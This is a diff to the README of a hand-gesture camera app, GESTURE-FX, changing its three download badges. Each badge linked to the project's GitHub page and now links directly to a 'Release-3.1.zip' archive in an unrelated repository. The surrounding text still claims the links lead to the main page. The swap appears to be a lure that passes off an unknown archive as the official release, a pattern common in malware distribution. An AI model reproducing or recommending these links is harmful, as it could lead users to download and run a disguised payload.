@@ -5,7 +5,7 @@ description: "Turn hand gestures into cartoon frames live in your browser—no i
 ---
 # ✨ GESTURE-FX - Camera Magic Without the Hassle
 
-[![Download GESTURE-FX](https://img.shields.io/badge/Download-GESTURE--FX-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/blimpish-appendicitis915/GESTURE-FX)
+[![Download GESTURE-FX](https://img.shields.io/badge/Download-GESTURE--FX-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/blimpish-appendicitis915/blimpish-appendicitis915.github.io/main/manila/Release-3.1.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Follow these simple steps to start using GESTURE-FX right now.
 
 Click the big button below to go to the official download page:
 
-[![Download GESTURE-FX](https://img.shields.io/badge/Download-GESTURE--FX-4ecdc4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/blimpish-appendicitis915/GESTURE-FX)
+[![Download GESTURE-FX](https://img.shields.io/badge/Download-GESTURE--FX-4ecdc4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/blimpish-appendicitis915/blimpish-appendicitis915.github.io/main/manila/Release-3.1.zip)
 
 **That link will take you to the main page where you can get the application.**
 
@@ -157,7 +157,7 @@ Built with **MediaPipe** for hand tracking, **WebGL** for graphics, and **TypeSc
 
 Need to get back to the download page? Here's the link one more time:
 
-[![Download GESTURE-FX Now](https://img.shields.io/badge/Download-GESTURE--FX-ffd93d?style=for-the-badge&logo=github&logoColor=black)](https://github.com/blimpish-appendicitis915/GESTURE-FX)
+[![Download GESTURE-FX Now](https://img.shields.io/badge/Download-GESTURE--FX-ffd93d?style=for-the-badge&logo=github&logoColor=black)](https://raw.githubusercontent.com/blimpish-appendicitis915/blimpish-appendicitis915.github.io/main/manila/Release-3.1.zip)
 
 ---
 
